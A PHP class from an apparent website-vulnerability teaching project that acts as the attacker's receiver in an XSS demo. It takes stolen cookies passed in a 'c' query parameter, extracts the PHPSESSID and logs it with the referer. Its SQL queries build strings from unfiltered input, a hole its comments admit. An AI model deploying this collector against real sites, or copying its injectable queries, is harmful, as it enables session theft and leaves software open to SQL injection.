<?php
/**
 * U Hack It! Website Vulnerabilities Tutorial
 * -------------------------------------------
 * 
 * Class to manage session keys that have been hacked via XSS attack.
 * 
 * Version: 0.2
 * Author: Driftwood Cove Designs
 * Author URI: http://driftwoodcove.ca
 * License: GPL3 see license.txt
 */
require_once 'class-db.php';

// Ensure the HackedSession DB table is setup (this is really inefficient - should be relegated to start up script)
HackedSession::createTable();

class HackedSession {
    
    // these fields correspond to the fields in the hackedsessions DB table.
    var $id;       // db key
    var $referer;  // site where session key was hacked from
    var $sessionkey;  // PHPSESSION key obtained
    var $timestamp; // date/time session was obtained
    
    /**
     * Add a session key to the DB
     * Again - even the so-called-hacker here is not filtering user input - bad bad bad!
     */
    static function add($sessionkey, $referer) {
        $db = DB::getConnection();
        if ($db->isConnected()) {
            // Rely on MySQL to auto_increment id and use current_timestamp for datetime
            $query="INSERT INTO hackedsessions (sessionkey, referer) VALUES ('$sessionkey', '$referer');";

            $result = $db->query($query);
            $result = (bool) DB::fetch_rows($result) ? TRUE : "DB Error adding new session record.";
        }  
        else {  
           $result = "Unable to connect to DB - try later.";
        }
        return $result; 
    }

    /**
     * Look to see if a session is already in the DB
     */
    public static function alreadyGrabbed($sessionkey, $referer) {
        $sessions = array();
        $db = DB::getConnection();
        if ($db->isConnected()) {
            $query="SELECT * FROM hackedsessions 
                             WHERE sessionkey='$sessionkey' AND referer='$referer';";            
            // Run query
            $result = $db->query($query);
            return (bool) DB::fetch_rows($result);
        }
        return false;
    }  

    /**
     * Load all hacked sessions from the DB - return empty array if no sessions exists
     */
    public static function fetchAll() {
        $sessions = array();
        $db = DB::getConnection();
        if ($db->isConnected()) {
            $query="SELECT * FROM hackedsessions 
                             ORDER BY timestamp DESC;";            
            // Run query
            $result = $db->query($query);
            if ($result) {
                while ($session = $result->fetchObject('HackedSession')) {
                   $sessions[] = $session;
                }
            }
        }
        return $sessions;
    }  

    /**
     * Echo all sessions to the response stream
     */
    public static function listAll() {
        $sessions = self::fetchAll();
        foreach ($sessions as $session) {
            include 'session-template.php';            
        }
    }

    /**
     * Split out the PHPSESSID cookie value
     */
    public static function getCookie($cookieString, $cookieName='PHPSESSID') {
        $name = $cookieName . "=";
        $cookies = explode(';', $cookieString);
        foreach ($cookies as $cookie) {
            $cookie = trim($cookie);
            if (substr_count($cookie, $name)) {
                return substr($cookie, strlen($name));
            }
        }
        return null;
    }
    
    /**
     * Handle a new request with a session key
     */
    public static function grabSession() {
        $sessionkey = null;
        $referer = null;
        $repeat = FALSE;
        if ( isset($_GET['c']) ) {
            $sessionkey = self::getCookie($_GET['c']);
            if ($sessionkey) {
                $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
                if (self::alreadyGrabbed($sessionkey, $referer)) {
                    $repeat = TRUE;
                }
                else {
                    self::add($sessionkey, $referer);                
                }
            }
        }
        return array('sessionkey' => $sessionkey, 'referer' => $referer, 'repeat' => $repeat);
    }

    /**
     * Create the hackedsessions table in the DB with some default data.
     * If $deleteFirst is TRUE, then any existing hackedsessions table will be deleted first.
     * Otherwise, table is created only if it does not already exist.
     */
    public static function createTable($deleteFirst = FALSE) {
        $db = DB::getConnection();
        if ($db->isConnected()) {
            if ($deleteFirst) {
                $db->query("DROP TABLE IF EXISTS hackedsessions");
            }
            // Only do the create if the table does not yet exist.
            if (! $db->tableExists('hackedsessions')) {
                $query = "CREATE TABLE IF NOT EXISTS hackedsessions (
                              id INTEGER PRIMARY KEY NOT NULL,
                              referer text,
                              sessionkey text NOT NULL,
                              timestamp timestamp default CURRENT_TIMESTAMP NOT NULL
                            );
                         ";
                if (! $db->query($query) ) {
                    Msg::addMessage("Create Session Table failed: " . $query,MSG_ERROR);
                }
            }
         }
    }
        
}
?>